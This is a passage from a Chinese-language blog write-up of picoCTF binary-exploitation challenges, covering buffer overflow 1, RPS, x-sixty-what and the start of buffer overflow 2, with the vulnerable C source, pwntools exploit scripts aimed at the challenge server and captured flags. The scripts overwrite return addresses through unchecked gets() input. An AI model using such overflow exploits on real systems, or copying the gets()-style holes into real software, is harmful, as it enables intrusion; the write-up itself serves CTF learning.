now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意main函数中的这一条语句<code>signal(SIGSEGV, sigsegv_handler);</code>，它表示在程序收到SIGSEGV信号时执行该函数。而这个函数打印flag的值。因此只需要输入使栈溢出即可，输入什么无关紧要。</p><p>picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}</p><h2 id="3-CVE-XXXX-XXXX"><a href="#3-CVE-XXXX-XXXX" class="headerlink" title="3. CVE-XXXX-XXXX"></a>3. CVE-XXXX-XXXX</h2><p>查CSDN。</p><p>picoCTF{CVE-2021-34527}</p><h2 id="4-buffer-overflow-1"><a href="#4-buffer-overflow-1" class="headerlink" title="4. buffer overflow 1"></a>4. buffer overflow 1</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;asm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span>, get_return_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出到win函数即可。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">49730</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please enter your string:&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(<span class="number">0x80491f6</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{addr3ss3s_ar3_3asy_ad2f467b}</p><h2 id="5-RPS"><a href="#5-RPS" class="headerlink" title="5. RPS"></a>5. RPS</h2><p>一个石头剪刀布游戏。</p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT 60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* hands[<span class="number">3</span>] = &#123;<span class="string">&quot;rock&quot;</span>, <span class="string">&quot;paper&quot;</span>, <span class="string">&quot;scissors&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span>* loses[<span class="number">3</span>] = &#123;<span class="string">&quot;paper&quot;</span>, <span class="string">&quot;scissors&quot;</span>, <span class="string">&quot;rock&quot;</span>&#125;;</span><br><span class="line"><span class="type">int</span> wins = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tgetinput</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    fd_set          input_set;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">timeout</span>;</span></span><br><span class="line">    <span class="type">int</span>             ready_for_reading = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>             read_bytes = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( l &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&#x27;l&#x27; for tgetinput must be greater than 0\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Empty the FD Set */</span></span><br><span class="line">    FD_ZERO(&amp;input_set );</span><br><span class="line">    <span class="comment">/* Listen to the input descriptor */</span></span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;input_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Waiting for some seconds */</span></span><br><span class="line">    timeout.tv_sec = WAIT;    <span class="comment">// WAIT seconds</span></span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;    <span class="comment">// 0 milliseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Listening for input stream for any activity */</span></span><br><span class="line">    ready_for_reading = select(<span class="number">1</span>, &amp;input_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">    <span class="comment">/* Here, first parameter is number of FDs in the set, </span></span><br><span class="line"><span class="comment">     * second is our FD set for reading,</span></span><br><span class="line"><span class="comment">     * third is the FD set in which any write activity needs to updated,</span></span><br><span class="line"><span class="comment">     * which is not required in this case. </span></span><br><span class="line"><span class="comment">     * Fourth is timeout</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Some error has occured in input */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read your input\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading) &#123;</span><br><span class="line">        read_bytes = read(<span class="number">0</span>, input, l<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(input[read_bytes<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        --read_bytes;</span><br><span class="line">        input[read_bytes]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(read_bytes==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No data given.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">play</span> <span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> player_turn[<span class="number">100</span>];</span><br><span class="line">  srand(time(<span class="number">0</span>));</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please make your selection (rock/paper/scissors):\n&quot;</span>);</span><br><span class="line">  r = tgetinput(player_turn, <span class="number">100</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> computer_turn = rand() % <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You played: %s\n&quot;</span>, player_turn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The computer played: %s\n&quot;</span>, hands[computer_turn]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(player_turn, loses[computer_turn])) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You win! Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Seems like you didn&#x27;t win this time. Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">3</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">  <span class="type">int</span> command;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you ready?&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;1&#x27; to play a game&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;2&#x27; to exit the program&quot;</span>);</span><br><span class="line">    r = tgetinput(input, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((command = strtol(input, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid number&quot;</span>);</span><br><span class="line">      </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (play()) &#123;</span><br><span class="line">        wins++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wins = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congrats, here&#x27;s the flag!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please type either 1 or 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意程序对用户输入的处理方式，是找到用户输入字符串中是否有’rock’，’paper’，’scissors’。也就是说如果输入’rockpaperscissors’就无论如何都能赢。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">51420</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please make your selection (rock/paper/scissors):&#x27;</span>,</span><br><span class="line"> <span class="string">b&#x27;rockpaperscissors&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please make your selection (rock/paper/scissors):&#x27;</span>,</span><br><span class="line"> <span class="string">b&#x27;rockpaperscissors&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Type \&#x27;2\&#x27; to exit the program&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}</p><h2 id="6-x-sixty-what"><a href="#6-x-sixty-what" class="headerlink" title="6. x-sixty-what"></a>6. x-sixty-what</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位的栈溢出，前面的是32位的。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">49518</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to 64-bit. Give me a string that gets you the flag: &#x27;</span>, </span><br><span class="line">cyclic(<span class="number">64</span> + <span class="number">8</span>) + p64(<span class="number">0x40123B</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{b1663r_15_b3773r_11c407bc}</p><h2 id="7-buffer-overflow-2"><a href="#7-buffer-overflow-2" class="headerlink" title="7. buffer overflow 2"></a>7. buffer overflow 2</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> arg1, <span class="type">unsigned</span> <span class="type">int</span> arg2)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="keyword">if</span> (arg1 != <span class="number">0xCAFEF00D</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (arg2 != <span class="number">0xF00DF00D</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span 